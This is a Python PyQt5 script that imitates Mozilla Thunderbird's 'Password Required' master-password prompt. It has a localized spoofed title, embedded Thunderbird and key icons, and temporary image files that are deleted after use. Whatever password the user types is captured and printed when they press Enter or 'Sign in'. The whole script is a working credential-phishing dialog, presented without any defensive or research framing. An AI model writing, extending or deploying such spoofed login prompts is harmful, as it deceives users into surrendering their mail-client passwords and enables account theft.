import sys
import os
import platform
import shutil
import base64
import random
from datetime import datetime
import enum
from PyQt5.QtWidgets import QApplication, QLabel, QWidget, QLineEdit, QPushButton, QDesktopWidget
from PyQt5 import QtGui

import filewriter


installed_os: str = platform.system()
LINUX: str = "Linux"
WINDOWS: str = "Windows"
master_password = ""


class Lang(enum.Enum):
    DE = "DE"
    EN = "EN"
    OTHER = "OTHER"

def determine_system_lang() -> Lang:
    """
    :returns: `Lang.DE` if the detected system language is German,
              `Lang.EN` if the detected system language is English,
              `Lang.OTHER` otherwise.
    """
    if installed_os == LINUX:
        if os.environ["LANG"].startswith("de_DE"):
            #print("German")
            return Lang.DE
        elif os.environ["LANG"].startswith("en_EN"):
            #print("English")
            return Lang.EN
        else:
            #print("other")
            return Lang.OTHER
    elif installed_os == WINDOWS:
        # TODO: Add Windows-specific imports and language detection code
        pass
    
lang: Lang = determine_system_lang()


def rand_dir_name() -> str:
    """
    Before calling this function, please call the function `random.seed` with a 
    non-fixed value.
    
    :returns: a random dir name consisting of six randomly determined digits.
    """
    rand_digits = filewriter.n_rand_numbers(6)
    dir_name = ""
    for d in rand_digits:
        dir_name += str(d)
    return dir_name


app = QApplication(sys.argv)
window = QWidget()
#FONT_SIZE : int = 9

DEFAULT22_BASE64 : str = ""\
"iVBORw0KGgoAAAANSUhEUgAAABYAAAAWCAYAAADEtGw7AAAEdUlEQVR42qWUezBcZxjG96/e/vJv"\
"pzONS9a6Lva+bgmxu0SVSTRIK0uqUdego6RoNSTRIDZWWJdlsYxWXYO0BLusIdaiLksGHcNUqtUy"\
"homO1NOza5hRpKb5Zp6Zc77vnN/znuc985JIL1mCiqfhAtnUHy4i9bMzUbXRzNsjZ6k3ntiS/u9i"\
"udwy4D0YUbnXzOOcbBaOYi1Yd0ZhkzQIs+sqWPrWvaB61azTBOWSE0Ntz+fFOCR3/aWDupXPwenB"\
"FDh3f4JtihqmIZ0wDD4ockDrjgNXnHss0M79vgHVs/h7K2E9+JVz4BFyLpiCo2gC7Bt9sPBrOgTd"\
"k5GwA1Y+tbNHgqmeJROm/nVwzJ0AX/4znCTTYOZNwD57HNSPmkAOfHQYerULRiHdML6mgPGnSth5"\
"VI4dgDr4FMtN/ethFNQO5zwtaKJhmCd3EDFoYZ0wAHKYEsZX2kHxa4ZpQMs+zITYPx3ZC3JMHyjx"\
"AzAOVYLjXJC3G4FAZGjuWw0ToqLotE64Fj2FX2QWrvKdwEgbBTmiR/+pZpeaQDQMdLcyWPs17MPM"\
"k9SgpGpgkjgAw5AumArbsNssj/wMckADvOJ/xPr6OkLrJuHxRQPsUobgGqeAtH4KZcReurgf12If"\
"4nJgFZyZ90CN7AD59ghMMkdhlKGBcZQSppFdMIvtxllXcQOJ6iWdPR3Yiiejv6CqfRCNs1r4lY4T"\
"13PY2to6VkXqZzDMG8O7OSNE9QqYx3XDMqEb1GQFnLyKVkkWFyqJxrRhe3sbm5ubSG4cxe9/brwU"\
"qtPwr+s4lTMEswQlrBK7YZOigN1NBRjp3XDyK98hmV+sIprWgS71oh6+sLCApaWl/wSvrKzAMkUJ"\
"my8VoKUpwMxQgn1XAW5YPbj+cujBIfc0CM5X68E6jY+PHwnT9WBychL9/f3QarWgpxPAb4g/IYsA"\
"ft0O7uctYAu/AzuwBkQUFeib+G0fuieNRrMPnJmZwdDQEKanp/Vx6c5XN56DI+oB99Zj2Kd3gB3e"\
"CNYn9WB9XAd2cC1INF/ZUk7t1CHw8vIyent79dWvrq4eOpeqZnFRrAQjuhXMyBYww5vBDGsCK3TX"\
"gGTjmS+Kyuzd+feLJ1HjwAIYcT+AEdO2axBFGEQ0gxNYs0Gi87INqb6V25XSbzGiGd3/1JPofIYK"\
"jOtt+krpOoPYR8R9K+w/qKjenRP83FJLatJzF8oVfBWfieICGZQK1ZER7GlycQ3i2jE4CApBS3ys"\
"N6DHt+tMXriwsw3254U17/68+dtCUN7yBPlNj9QzFpeHCgukbeVl8rUepervo0xuZnSCHVANrreM"\
"iOChPg5HvuTDA4OIzssysHK+s0B5RwiTNwRBRq/zDE+9dk7vXFhYaCvJLzlgMji8CC6/CPZuEnAu"\
"ycEKqoUDX1J97Fy2on5WYkaJUB13rjNJTS9ROXlLdzjuJeAKCDivkDAokJFeZTF8KnyY75evsd4r"\
"W2N7loLjIZ3nuBf7vBKUdrE6lX5BnsrwqRQxvcsbmV6yoOOe/QfLaRAj5n2jwQAAAABJRU5ErkJg"\
"gg=="

KEY_SCREENSHOT_BASE64: str = ""\
"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"

if lang == Lang.DE:
    window.setWindowTitle("Passwort erforderlich - Mozilla Thunderbird")
else:
    window.setWindowTitle("Password Required - Mozilla Thunderbird")
#window.setFont(QtGui.QFont("Arial", FONT_SIZE))
random.seed((datetime.now()).strftime("%H%M%S"))
dir_name: str = rand_dir_name()
# If the randomly determined directory name already exists, create a new one
# until a name is found that does not already exist:
while os.path.isdir(dir_name):
    dir_name = rand_dir_name()
os.mkdir(dir_name)
encoded_tb_icon_path: str = os.path.join(dir_name, "default22_decoded.png")
with open(encoded_tb_icon_path, "wb") as tb_icon:
    tb_icon.write(base64.b64decode(DEFAULT22_BASE64))
window.setWindowIcon(QtGui.QIcon(encoded_tb_icon_path))
window.setGeometry(100, 100, 390, 150)

# Let the window sporn in the center of the screen:
fg = window.frameGeometry()
center_point = QDesktopWidget().availableGeometry().center()
fg.moveCenter(center_point)
window.move(fg.topLeft())

key = QLabel(parent=window)
encoded_key_icon_path: str = os.path.join(dir_name, "key_screenshot_decoded.png")
with open(encoded_key_icon_path, "wb") as key_icon:
    key_icon.write(base64.b64decode(KEY_SCREENSHOT_BASE64))
pixmap = QtGui.QPixmap(encoded_key_icon_path)
key.setPixmap(pixmap)
key.move(15,15)
shutil.rmtree(dir_name, ignore_errors=True)

if lang == Lang.DE:
    msg = QLabel("Bitte geben Sie Ihr Hauptpasswort ein.", parent=window)
else:
    msg = QLabel("Please enter your Primary Password.", parent=window)
msg.move(75, 30)

textfield = QLineEdit(parent=window)
textfield.move(70, 65)
textfield.setMinimumWidth(305)

def copy_master_password() -> None:
    master_password = textfield.text()
    print(f"master_password = {master_password}")

textfield.returnPressed.connect(copy_master_password)

cancel_button = QPushButton("Cancel", parent=window)
#cancel_button.setFont(QtGui.QFont("Arial", FONT_SIZE))
cancel_button.setGeometry(200, 108, 85, 30)

sign_in_button = QPushButton("Sign in", parent=window)
#sign_in_button.setFont(QtGui.QFont("Arial", FONT_SIZE))
sign_in_button.setGeometry(290, 108, 85, 30)
sign_in_button.setFocus()
# sign_in_button.setAutoDefault(True)
sign_in_button.clicked.connect(copy_master_password)

window.show()

# Start the application's event loop (`app.exec_()`), wrapped in a call to
# `sys.exit()` to cleanly exit the program and release memory resources when 
# the application terminates.
sys.exit(app.exec_())
